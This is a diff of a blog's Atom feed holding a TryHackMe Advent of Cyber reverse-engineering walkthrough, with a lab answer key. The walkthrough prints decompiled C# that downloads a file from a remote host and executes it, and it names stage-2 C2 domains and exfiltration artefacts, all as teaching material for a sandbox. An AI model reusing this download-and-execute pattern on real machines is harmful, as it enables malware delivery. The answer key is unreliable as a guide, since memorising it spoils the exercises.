@@ -1,4 +1,302 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-12-20T21:21:22-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">THM Advent of Cyber 2024</title><subtitle>a minimalist Jekyll theme for running a blog or publication</subtitle><author><name>Michael</name></author><entry><title type="html">TryHacneMe Advent of Cyber 2023 - Day 20</title><link href="http://localhost:4000/Day20" rel="alternate" type="text/html" title="TryHacneMe Advent of Cyber 2023 - Day 20" /><published>2024-12-20T00:00:00-05:00</published><updated>2024-12-20T00:00:00-05:00</updated><id>http://localhost:4000/Day20</id><content type="html" xml:base="http://localhost:4000/Day20"><![CDATA[<h1 id="the-story">The Story</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-12-22T01:15:41-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">THM Advent of Cyber 2024</title><subtitle>a minimalist Jekyll theme for running a blog or publication</subtitle><author><name>Michael</name></author><entry><title type="html">TryHackMe ADvent of Cyber 2024 - Day 21</title><link href="http://localhost:4000/Day21" rel="alternate" type="text/html" title="TryHackMe ADvent of Cyber 2024 - Day 21" /><published>2024-12-21T00:00:00-05:00</published><updated>2024-12-21T00:00:00-05:00</updated><id>http://localhost:4000/Day21</id><content type="html" xml:base="http://localhost:4000/Day21"><![CDATA[<p>The Story</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732165566749.png" alt="Task banner for day 21" /></p>
+
+<p>\n</p>
+
+<p><em>McSkidy’s alert dashboard lit up with an unusual alert. A file-sharing web application built by Glitch had triggered a security warning. Glitch had been working hard during this season’s SOC-mas after the last scare with the Yule Log Exploit, but this new alert caused McSkidy to question his intentions.</em></p>
+
+<p><em>McSkidy began to investigate. It seemed the source of the alert came from a binary file that made its way to the web app’s backend. It did not belong there and had some anomalous activity. The binary was compiled with .NET. This whole setup seemed quite unusual, and with Glitch working on the latest security updates, McSkidy was filled with suspicion.</em></p>
+
+<p><em>As McSkidy continued her investigation, Glitch rushed into the room: “I swear I did not put it there! I was testing defences, but I wouldn’t go that far!</em></p>
+
+<p><em>McSkidy reassured him, “This doesn’t look like your work. Let’s get to the bottom of this. Put on your decompiling hat, and let’s see what we are dealing with.”</em></p>
+
+<h2 id="learning-objectives">Learning Objectives</h2>
+
+<ul>
+  <li>Understanding the structure of a binary file </li>
+  <li>The difference between Disassembly vs Decompiling</li>
+  <li>Familiarity with multi-stage binaries</li>
+  <li>Practically reversing a  multi-stage binary</li>
+</ul>
+
+<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>
+
+<p>Before moving forward, review the questions in the connection card shown below:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1731050107820.png" alt="Task connection card." /></p>
+
+<p>Click on the green <code class="language-plaintext highlighter-rouge">Start Machine</code> button below to start the virtual machine in split-screen view. If the VM is not visible, use the blue <code class="language-plaintext highlighter-rouge">Show Split View</code> button at the top of the page. Alternatively, you can connect to the VM via Remote Desktop (RDP) using the credentials below:</p>
+
+<p>Start Machine</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/be629720b11a294819516c1d4e738c92.png" alt="THM key" /></p>
+
+<table>
+  <thead>
+    <tr>
+      <th><strong>Username</strong></th>
+      <th>Administrator</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Password</strong></td>
+      <td>AOCRE123!</td>
+    </tr>
+    <tr>
+      <td><strong>IP</strong></td>
+      <td>10.10.135.151</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="introduction-to-reverse-engineering">Introduction to Reverse Engineering</h2>
+
+<p>Reverse Engineering (RE) is the process of breaking something down to understand its function. In cyber security, reverse engineering is used to analyse how applications (binaries) function. This can be used to determine whether or not the application is malicious or if there are any security bugs present.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1729850809897.png" alt="WannaCry popup asking for payment" /> \n</p>
+
+<p>For example, cyber security analysts reverse engineer malicious applications distributed by attackers to understand if there are any attributable indicators to associate the binary with an attacker and any potential ways to defend against the malicious binary. A famous example of this is the <a href="https://en.wikipedia.org/wiki/WannaCry_ransomware_attack">WannaCry</a> ransomware in May 2017. Security researcher <a href="https://en.wikipedia.org/wiki/Marcus_Hutchins">Marcus Hutchins</a> reverse-engineered the ransomware application and discovered a specific function within the application where the malware wouldn’t run if a particular domain were registered and available.</p>
+
+<p>Marcus then registered this domain, stopping the global WannaCry attack. This is just one of many famous cases of reverse engineering being used in cyber security defence.</p>
+
+<h2 id="binaries">Binaries</h2>
+
+<p>﻿In computing, binaries are files compiled from source code. For example, you run a binary when launching an executable file on your computer. At one point in time, this application would’ve been programmed in a programming language such as C#. It is then compiled, and the compiler translates the code into machine instructions.</p>
+
+<p>Binaries have a specific structure depending on the operating system they are designed to run. For example, Windows binaries follow the Portable Executable (PE) structure, whereas on Linux, binaries follow the Executable and Linkable Format (ELF). This is why, for example, you cannot run a <strong>.exe</strong> file on MacOS. With that said, all binaries will contain at least:</p>
+
+<ul>
+  <li><strong>A code section:</strong> This section contains the instructions that the CPU will execute</li>
+  <li><strong>A data section:</strong> This section contains information such as variables, resources (images, other data), etc</li>
+  <li><strong>Import/Export tables:</strong> These tables reference additional libraries used (imported) or exported by the binary. Binaries often rely on libraries to perform functions. For example, interacting with the Windows API to manipulate files</li>
+</ul>
+
+<p>The binaries in today’s task follow the PE structure. This structure will be explained throughout the task.</p>
+
+<h2 id="disassembly-vs-decompiling">Disassembly Vs. Decompiling</h2>
+
+<p>When reverse engineering binaries, you will employ two primary techniques. This task section will introduce you to disassembly and decompiling, explaining the key differences and their pros and cons.</p>
+
+<p>Disassembling a binary shows the low-level machine instructions the binary will perform (you may know this as assembly). Because the output is translated machine instructions, you can see a detailed view of how the binary will interact with the system at what stage. Tools such as IDA, Ghidra, and GDB can do this.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1729849249700.png" alt="disassembling a binary" /> \n</p>
+
+<p>Decompiling, however, converts the binary into its high-level code, such as C++, C#, etc., making it easier to read. However, this translation can often lose information such as variable names. This method of reverse engineering a binary is useful if you want to get a high-level understanding of the application’s flow.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1729849283353.png" alt="Decompiling using ILSpy" /> \n</p>
+
+<p>There are specific circumstances where you would choose one method over the other. For example, decompiling is sometimes a “best guess” based on the tooling you’ve used and does not provide the actual full source code.</p>
+
+<p>A table outlining the key differences between the two has been provided below.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th><strong>Comparison</strong></th>
+      <th><strong>Disassembly</strong></th>
+      <th><strong>Decompiling</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Readability</strong></td>
+      <td>Requires knowing assembly and low-level knowledge of computing concepts.</td>
+      <td>Requires familiarity with programming and logic</td>
+    </tr>
+    <tr>
+      <td><strong>Level of output</strong></td>
+      <td>The translated output is the exact instructions that the machine will perform.</td>
+      <td>The translated output is often a “best guess”. The output may not be accurate, and useful information, such as variables, function names, etc, will likely be lost.</td>
+    </tr>
+    <tr>
+      <td><strong>Difficulty</strong></td>
+      <td>The difficulty can be considered higher as the machine instructions are translated into assembly.</td>
+      <td>The machine instructions are translated into a high-level language, which makes them easier to understand if you are familiar with the language the binary is written in.</td>
+    </tr>
+    <tr>
+      <td><strong>Usefulness</strong></td>
+      <td>The entire behaviour of the binary can be studied given enough time.</td>
+      <td>Decompiling is a quick way to understand some of the logic of the binary.</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="multi-stage-binaries">Multi-Stage Binaries</h2>
+
+<p>Recent trends in cyber security have seen the rise of attackers using what’s known as “Multi-stage binaries” in their campaigns - especially malware. These attacks involve using multiple binaries responsible for different actions rather than one performing the entire attack. Usually, an attack involving various binaries will look like the following:</p>
+
+<ol>
+  <li><strong>Stage 1 - Dropper:</strong> This binary is usually a lightweight, basic binary responsible for actions such as enumerating the operating system to see if the payload will work. Once certain conditions are verified, the binary will download the second - much more malicious - binary from the attacker’s infrastructure.</li>
+  <li><strong>Stage 2 - Payload:</strong> This binary is the “meat and bones” of the attack. For example, in the event of ransomware, this payload will encrypt and exfiltrate the data.</li>
+</ol>
+
+<p>Sophisticated attackers may further split actions of the attack chain (e.g., lateral movement) into additional binaries. Using multiple stages helps evade detection and makes the analysis process more difficult.</p>
+
+<p>For example, a small, more “harmless” initial binary is likelier to evade detection via email filtering than a fully-fledged binary that performs malicious actions such as encryption. Additionally, splitting these functions into multiple stages gives the attacker much more control (i.e. only downloading specific stages once conditions such as time have been met).</p>
+
+<p>The diagram below shows what an attack involving multiple staged binaries may look like.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732167874084.png" alt="Depicting the stages of a multi-stage binary. At first there is an entry point such as from a phishing email, then an initial dropper which executes a downloader containing the malware" /></p>
+
+<h2 id="jingle-net-all-the-way">Jingle .NET all the way</h2>
+
+<p>For today’s task, you will be reverse engineering two .NET binaries using the decompiler ILSpy. You can follow the walkthrough below in reverse engineering using an example application named <code class="language-plaintext highlighter-rouge">demo.exe</code>. Then, you will reverse an application on your own at the end of this task.</p>
+
+<p>Before analysing our target, we need to learn and find a way to identify the original binary file, modify it, or use it as evidence. Also, it is good practice to have a big picture of the file we are dealing with so that we can choose the proper tools we will need.</p>
+
+<p>Let’s start by navigating to the file location in the <strong>demo</strong> folder on the machine’s Desktop by right-clicking on the file named <strong>demo</strong> and clicking on <code class="language-plaintext highlighter-rouge">Properties</code>.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/66264cef7bba67a6bbbe7179/room-content/66264cef7bba67a6bbbe7179-1729800848396.png" alt="clicking on properties option" /></p>
+
+<p>\n</p>
+
+<p>We can observe that the file’s extension is .exe, indicating that it is a Windows executable.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/66264cef7bba67a6bbbe7179/room-content/66264cef7bba67a6bbbe7179-1729642810578.png" alt="checking properties of demo.exe" /> \n</p>
+
+<p>Since it’s a Windows file, we’ll use <a href="https://www.winitor.com/download">PEStudio</a>, a software designed to investigate potentially malicious files and extract information from them without execution. This will help us focus on the static analysis side of the investigation. Let’s open PEstudio from the taskbar and then click on  <strong>File</strong> &gt; <strong>Open</strong> and select the file <code class="language-plaintext highlighter-rouge">demo.exe</code> located in <code class="language-plaintext highlighter-rouge">C:\Users\Administrator\Desktop\demo\demo.exe</code> as shown below.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732169586145.png" alt="opening file in PEStuido" /> \n</p>
+
+<p>As shown below, PEStudio will display information about the file, so let’s start enumerating some of the most important aspects we can get from it. Using the left panel, we can navigate through different sections that will share different types of information about the file. In the general information output displayed when opening the file, we can see the hash of the file in the form of <strong>SHA-256</strong>, The architecture type, in this case, <strong>x64</strong>, the file type, and the signature of the language used to compile the executable, in this case, .<strong>NET framework</strong> that uses the C# language.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732169775728.png" alt="analysing headers in PEStudio" /> \n</p>
+
+<p>Let’s focus on some critical data we can obtain. First, if we want to identify the file and provide evidence of its alteration, we need to take note of the file’s SHA-256 hash, as we mentioned above, as well as the hash of each section on the PE file. PE stands for Portable Executable, and it’s the format in which Windows executables are arranged; you can learn more about it <a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format">here</a>. </p>
+
+<p><a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#section-table-section-headers">The sections</a> represent a memory space with different content of the Windows executable within the PE format. We can calculate the hash of these sections in order to identify the executable properly. We’ll focus this time on two hashes: the one from the <a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#:\~:text=in%20that%20module.-,.text,Executable%20code%20(free%20format),-IMAGE_SCN_CNT_CODE%20%7C%20IMAGE_SCN_MEM_EXECUTE%20%7C%20IIMAGE_SCN_MEM_READ">.text</a> section, which is the section on the file containing the executable code; this section is often marked as Read and executable, so it should not have any alterations when the file is being copied. We can observe them in the screenshot below:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732169883274.png" alt="checking sections in PEStudio" /> \n</p>
+
+<p>Another essential section we can use to obtain information about the binary is the “indicators” section. This section tells us about the potential indicators like URLs or other suspicious attributes of a binary.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732170189213.png" alt="Checking Strings in PEStudio" /></p>
+
+<p>The screenshot above shows several strings on the file, like file names, URLs, and function names. This can be very important depending on the file’s execution flow. Additionally, looking for artefacts such as IP addresses, URLs, and crypto wallets can be a “quick win” for gathering some identifying intelligence. We’ll learn about that in the next section.</p>
+
+<p>Now that we have information about the file we are investigating, let’s try to understand what the executable is doing. We need to understand its flow. If we try to read the file by opening it, we cannot do it since it’s in binary format. In the previous section, we learned that the file is compiled using the <code class="language-plaintext highlighter-rouge">.NET</code> framework used by the <code class="language-plaintext highlighter-rouge">C#</code> language; we can decompile the binary code into C# using a decompilation tool like <a href="https://github.com/icsharpcode/ILSpy">ILSpy</a>.</p>
+
+<p>This tool will decompile the code, providing us with readable information we can use to determine the flow of execution. Let’s start by opening ILSpy from the taskbar and then click on <code class="language-plaintext highlighter-rouge">File &gt; Open</code> and then navigate to <code class="language-plaintext highlighter-rouge">C:\Users\Administrator\Desktop\demo</code> and select the file <code class="language-plaintext highlighter-rouge">demo.exe</code>. The tool <code class="language-plaintext highlighter-rouge">ILSpy</code> may take up to 30 seconds to appear on the screen.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/66264cef7bba67a6bbbe7179/room-content/66264cef7bba67a6bbbe7179-1729645613616.png" alt="Opening file in ILSpy" /></p>
+
+<p>As we can observe from above, the left panel contains the libraries used by the framework, and the actual decompiled code is in the section with the file name <strong>demo</strong>. Let’s click on it to expand and see what it contains.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/66264cef7bba67a6bbbe7179/room-content/66264cef7bba67a6bbbe7179-1729797176418.png" alt="checking code in ILSpy" /></p>
+
+<p>As the screenshot above shows, ILSpy can provide much information, like metadata and references. However, the actual show is displayed on the brackets symbols {}, in this case, under <code class="language-plaintext highlighter-rouge">DemoBinary &gt; Program &gt; Main</code>, which is actually the Main function of the executable. Now that we have access to the code running on the binary, let’s analyse it.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">private</span> <span class="kd">static</span> <span class="k">void</span> <span class="nc">Main</span><span class="p">(</span><span class="nx">string</span><span class="p">[]</span> <span class="nx">args</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="nx">Console</span><span class="p">.</span><span class="nc">WriteLine</span><span class="p">(</span><span class="dl">"</span><span class="s2">Hello THM DEMO Binary</span><span class="dl">"</span><span class="p">);</span>
+	<span class="nx">Thread</span><span class="p">.</span><span class="nc">Sleep</span><span class="p">(</span><span class="mi">5000</span><span class="p">);</span>
+	<span class="nx">string</span> <span class="nx">address</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://10.10.10.10/img/tryhackme_connect.png</span><span class="dl">"</span><span class="p">;</span>
+	<span class="nx">string</span> <span class="nx">text</span> <span class="o">=</span> <span class="nx">Path</span><span class="p">.</span><span class="nc">Combine</span><span class="p">(</span><span class="nx">Environment</span><span class="p">.</span><span class="nc">GetFolderPath</span><span class="p">(</span><span class="nx">Environment</span><span class="p">.</span><span class="nx">SpecialFolder</span><span class="p">.</span><span class="nx">Desktop</span><span class="p">),</span> <span class="dl">"</span><span class="s2">thm-demo.png</span><span class="dl">"</span><span class="p">);</span>
+	<span class="nf">using </span><span class="p">(</span><span class="nx">WebClient</span> <span class="nx">webClient</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">WebClient</span><span class="p">())</span>
+	<span class="p">{</span>
+		<span class="k">try</span>
+		<span class="p">{</span>
+			<span class="nx">Console</span><span class="p">.</span><span class="nc">WriteLine</span><span class="p">(</span><span class="dl">"</span><span class="s2">Downloading file...</span><span class="dl">"</span><span class="p">);</span>
+			<span class="nx">webClient</span><span class="p">.</span><span class="nc">DownloadFile</span><span class="p">(</span><span class="nx">address</span><span class="p">,</span> <span class="nx">text</span><span class="p">);</span>
+			<span class="nx">Console</span><span class="p">.</span><span class="nc">WriteLine</span><span class="p">(</span><span class="dl">"</span><span class="s2">File downloaded to: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">text</span><span class="p">);</span>
+			<span class="nx">Process</span><span class="p">.</span><span class="nc">Start</span><span class="p">(</span><span class="k">new</span> <span class="nc">ProcessStartInfo</span><span class="p">(</span><span class="nx">text</span><span class="p">)</span>
+			<span class="p">{</span>
+				<span class="nx">UseShellExecute</span> <span class="o">=</span> <span class="kc">true</span>
+			<span class="p">});</span>
+			<span class="nx">Console</span><span class="p">.</span><span class="nc">WriteLine</span><span class="p">(</span><span class="dl">"</span><span class="s2">Image opened successfully.</span><span class="dl">"</span><span class="p">);</span>
+		<span class="p">}</span>
+		<span class="k">catch </span><span class="p">(</span><span class="nx">Exception</span> <span class="nx">ex</span><span class="p">)</span>
+		<span class="p">{</span>
+			<span class="nx">Console</span><span class="p">.</span><span class="nc">WriteLine</span><span class="p">(</span><span class="dl">"</span><span class="s2">An error occurred: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">ex</span><span class="p">.</span><span class="nx">Message</span><span class="p">);</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="nx">Console</span><span class="p">.</span><span class="nc">WriteLine</span><span class="p">(</span><span class="dl">"</span><span class="s2">Bye Bye leaving Demo Binary</span><span class="dl">"</span><span class="p">);</span>
+	<span class="nx">Thread</span><span class="p">.</span><span class="nc">Sleep</span><span class="p">(</span><span class="mi">5000</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The code above displays the main function and its code. We can observe that first, it prints to the screen the message “Hello THM DEMO Binary” using the <a href="https://learn.microsoft.com/en-us/dotnet/api/system.console.writeline?view=net-8.0">Console.Writeline method</a>.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Console</span><span class="p">.</span><span class="nc">WriteLine</span><span class="p">(</span><span class="dl">"</span><span class="s2">Hello THM DEMO Binary</span><span class="dl">"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>It then uses the <a href="https://learn.microsoft.com/en-us/dotnet/api/system.threading.thread.sleep?view=net-8.0">Sleep</a> method to wait for 5 seconds.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Thread</span><span class="p">.</span><span class="nc">Sleep</span><span class="p">(</span><span class="mi">5000</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Then, it assigns a value to two string variables: address and text, the first one with a URL accessing a PNG file, and the second one with a file name on the user’s Desktop named <strong>thm-demo.png</strong>.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">string</span> <span class="nx">address</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://10.10.10.10/img/tryhackme_connect.png</span><span class="dl">"</span><span class="p">;</span>
+<span class="nx">string</span> <span class="nx">text</span> <span class="o">=</span> <span class="nx">Path</span><span class="p">.</span><span class="nc">Combine</span><span class="p">(</span><span class="nx">Environment</span><span class="p">.</span><span class="nc">GetFolderPath</span><span class="p">(</span><span class="nx">Environment</span><span class="p">.</span><span class="nx">SpecialFolder</span><span class="p">.</span><span class="nx">Desktop</span><span class="p">),</span> <span class="dl">"</span><span class="s2">thm-demo.png</span><span class="dl">"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Then, it will try to connect to the URL on the <strong>address</strong> variable and save the content to a file on the Desktop using the <a href="https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-8.0">WebClient class</a>, and it will then execute the downloaded file path assigned to the <strong>text</strong> variable using the <a href="https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.process?view=net-8.0">Process class</a>  and the <a href="https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.process.start?view=net-8.0#system-diagnostics-process-start(system-string)">Start method</a>, as displayed below.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">using </span><span class="p">(</span><span class="nx">WebClient</span> <span class="nx">webClient</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">WebClient</span><span class="p">())</span>
+	<span class="p">{</span>
+		<span class="k">try</span>
+		<span class="p">{</span>
+			<span class="nx">Console</span><span class="p">.</span><span class="nc">WriteLine</span><span class="p">(</span><span class="dl">"</span><span class="s2">Downloading file...</span><span class="dl">"</span><span class="p">);</span>
+			<span class="nx">webClient</span><span class="p">.</span><span class="nc">DownloadFile</span><span class="p">(</span><span class="nx">address</span><span class="p">,</span> <span class="nx">text</span><span class="p">);</span>
+			<span class="nx">Console</span><span class="p">.</span><span class="nc">WriteLine</span><span class="p">(</span><span class="dl">"</span><span class="s2">File downloaded to: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">text</span><span class="p">);</span>
+			<span class="nx">Process</span><span class="p">.</span><span class="nc">Start</span><span class="p">(</span><span class="k">new</span> <span class="nc">ProcessStartInfo</span><span class="p">(</span><span class="nx">text</span><span class="p">)</span>
+			<span class="p">{</span>
+				<span class="nx">UseShellExecute</span> <span class="o">=</span> <span class="kc">true</span>
+			<span class="p">});</span>
+			<span class="nx">Console</span><span class="p">.</span><span class="nc">WriteLine</span><span class="p">(</span><span class="dl">"</span><span class="s2">Image opened successfully.</span><span class="dl">"</span><span class="p">);</span>
+		<span class="p">}</span>
+		<span class="k">catch </span><span class="p">(</span><span class="nx">Exception</span> <span class="nx">ex</span><span class="p">)</span>
+		<span class="p">{</span>
+			<span class="nx">Console</span><span class="p">.</span><span class="nc">WriteLine</span><span class="p">(</span><span class="dl">"</span><span class="s2">An error occurred: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">ex</span><span class="p">.</span><span class="nx">Message</span><span class="p">);</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Finally, it prints the message “<strong>Bye Bye, leaving THM DEMO Binary</strong>” again to the console and waits for 5 seconds using the <strong>Sleep</strong> method before closing.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="nx">Console</span><span class="p">.</span><span class="nc">WriteLine</span><span class="p">(</span><span class="dl">"</span><span class="s2">By bye leaving THM Demo Binary</span><span class="dl">"</span><span class="p">);</span>
+	<span class="nx">Thread</span><span class="p">.</span><span class="nc">Sleep</span><span class="p">(</span><span class="mi">5000</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Great! We now understand what the binary is doing. It will download a PNG file to the user’s Desktop from the URL: <code class="language-plaintext highlighter-rouge">http://10.10.10.10/img/tryhackme_connect.png</code>. Let’s execute the file and see if this is true. Once the binary starts, wait for the text “<code class="language-plaintext highlighter-rouge">Hello THM DEMO Binary</code>” to appear, then press <code class="language-plaintext highlighter-rouge">Enter</code> to download the file.</p>
+
+<p><strong>Note</strong>: <em>We are only executing the binary because we are in a sandbox environment; execution of an unknown binary on a host machine is NOT recommended.</em></p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/66264cef7bba67a6bbbe7179/room-content/66264cef7bba67a6bbbe7179-1729799008710.png" alt="Opening file in Paint" /></p>
+
+<p>After executing the file, we can observe that it was downloaded to the Desktop, and the messages print to the screen as expected. Also, the downloaded file is executed and opened using the default app for PNG <strong>Paint</strong>. Excellent, we successfully Reverse-Engineered the flow of the code.</p>
+
+<p>Now that we have some practice, join McSkidy and help investigate the alerts coming from the file <em>WarevilleApp.exe</em>. Put on your reverse engineering hat and help decipher the mystery behind this suspicious binary.</p>
+
+<p><strong>Note</strong>: To answer the question, you will need to reverse the application <code class="language-plaintext highlighter-rouge">WarevilleApp.exe</code>, located at <code class="language-plaintext highlighter-rouge">C:\Users\Administrator\Desktop\</code>.</p>
+
+<h2 id="answer-the-questions-below">Answer the questions below</h2>
+
+<p>What is the function name that downloads and executes files in the WarevilleApp.exe?</p>
+
+<p>DownloadAndExecuteFile</p>
+
+<p>Once you execute the WarevilleApp.exe, it downloads another binary to the Downloads folder. What is the name of the binary?</p>
+
+<p>explorer.exe</p>
+
+<p>What domain name is the one from where the file is downloaded after running WarevilleApp.exe?</p>
+
+<p>mayorc2.thm</p>
+
+<p>The stage 2 binary is executed automatically and creates a zip file comprising the victim’s computer data; what is the name of the zip file?</p>
+
+<p>CollectedFiles.zip</p>
+
+<p>What is the name of the C2 server where the stage 2 binary tries to upload files?</p>
+
+<p>anonymousc2.thm</p>
+
+<p>If you enjoyed this task, feel free to check out the <a href="https://tryhackme.com/r/room/x86assemblycrashcourse">x86 Assembly Crash Course</a> room.</p>]]></content><author><name>Michael</name></author><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day21Header.png" /><media:content medium="image" url="http://localhost:4000/Day21Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHacneMe Advent of Cyber 2023 - Day 20</title><link href="http://localhost:4000/Day20" rel="alternate" type="text/html" title="TryHacneMe Advent of Cyber 2023 - Day 20" /><published>2024-12-20T00:00:00-05:00</published><updated>2024-12-20T00:00:00-05:00</updated><id>http://localhost:4000/Day20</id><content type="html" xml:base="http://localhost:4000/Day20"><![CDATA[<h1 id="the-story">The Story</h1>
 
 <p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1731076103117.png" alt="Task banner for day DAY 20" /></p>
 
@@ -2517,345 +2815,4 @@ THM{WON_THE_RACE_007}</p>
 
 <p>If you enjoyed this task, feel free to check out the <a href="https://tryhackme.com/r/room/raceconditionsattacks">Race Conditions</a> room!</p>
 
-<p>Where balances shift and numbers soar, look for an entry - an open door!</p>]]></content><author><name>Miuchael</name></author><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day12Header.png" /><media:content medium="image" url="http://localhost:4000/Day12Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe Advent of Cyber - Day 11</title><link href="http://localhost:4000/Day11" rel="alternate" type="text/html" title="TryHackMe Advent of Cyber - Day 11" /><published>2024-12-11T00:00:00-05:00</published><updated>2024-12-11T00:00:00-05:00</updated><id>http://localhost:4000/Day11</id><content type="html" xml:base="http://localhost:4000/Day11"><![CDATA[<p>The Story</p>
-
-<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/618b3fa52f0acc0061fb0172/room-content/618b3fa52f0acc0061fb0172-1730305996223.png" alt="Task banner for day 11" /></p>
-
-<p>The much-awaited SOC-mas of Wareville town is just days away! Glitch, the unsung hero, is closing all the doors to Mayor Malware’s malicious intentions one by one. However, there is still much more to do.</p>
-
-<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/618b3fa52f0acc0061fb0172/room-content/618b3fa52f0acc0061fb0172-1730324115409.png" alt="McSkidy Cindy Lou posing with arms crossed." />McSkidy took a thoughtful breath. <em>“Mayor can still find his way in!”</em></p>
-
-<p>Glitch smiles confidently. <em>“I think I know the last technique he relies on to get into the networks.”</em></p>
-
-<p>McSkidy stands up from her chair with a surge of excitement. <em>“Let me guess, it’s a notorious way to get into a network - a Wi-Fi attack?!”</em></p>
-
-<p>Glitch nods decisively. <em>“Exactly! Let’s be one step ahead of the Mayor.”</em></p>
-
-<h2 id="learning-objectives">Learning Objectives</h2>
-
-<ul>
-  <li>Understand what Wi-Fi is</li>
-  <li>Explore its importance for an organisation</li>
-  <li>Learn the different Wi-Fi attacks</li>
-  <li>Learn about the WPA/WPA2 cracking attack</li>
-</ul>
-
-<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>
-
-<p>Before moving forward, review the questions in the connection card shown below:</p>
-
-<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/618b3fa52f0acc0061fb0172/room-content/618b3fa52f0acc0061fb0172-1730309059191.png" alt="Banner showing connection options provided in this room." /></p>
-
